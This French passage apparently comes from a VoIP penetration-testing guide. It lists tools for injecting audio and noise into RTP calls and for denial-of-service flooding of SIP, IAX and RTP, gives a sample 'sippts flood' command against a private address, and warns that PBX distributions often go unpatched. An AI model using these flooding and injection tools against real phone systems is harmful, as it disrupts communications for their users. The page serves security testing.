Ou vous pourriez utiliser les scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) pour **scanner les conversations** (**`rtpscan.pl`**), envoyer un `.wav` à une conversation (**`rtpsend.pl`**) et **insérer du bruit** dans une conversation (**`rtpflood.pl`**).

### DoS

Il existe plusieurs façons d'essayer d'atteindre le DoS sur les serveurs VoIP.

- **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS flood envoie des messages illimités à la cible.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS ping effectue un ping SIP pour voir le temps de réponse du serveur.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS du protocole IAX utilisé par Asterisk.
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Un outil pour effectuer un flooding de messages SIP/SDP INVITE sur UDP/IP.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envoie plusieurs paquets RTP bien formés. Il est nécessaire de connaître les ports RTP utilisés (sniffer d'abord).
- [**SIPp**](https://github.com/SIPp/sipp): Permet d'analyser et de générer du trafic SIP. Il peut donc également être utilisé pour le DoS.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Couteau suisse SIP. Peut également être utilisé pour effectuer des attaques SIP.
- Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnérabilités OS

Le moyen le plus simple d'installer un logiciel tel qu'Asterisk est de télécharger une **distribution OS** qui l'a déjà installé, comme : **FreePBX, Elastix, Trixbox**... Le problème avec ceux-ci est qu'une fois qu'ils fonctionnent, les administrateurs système pourraient **ne pas les mettre à jour à nouveau** et des **vulnérabilités** seront découvertes avec le temps.

## Références

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
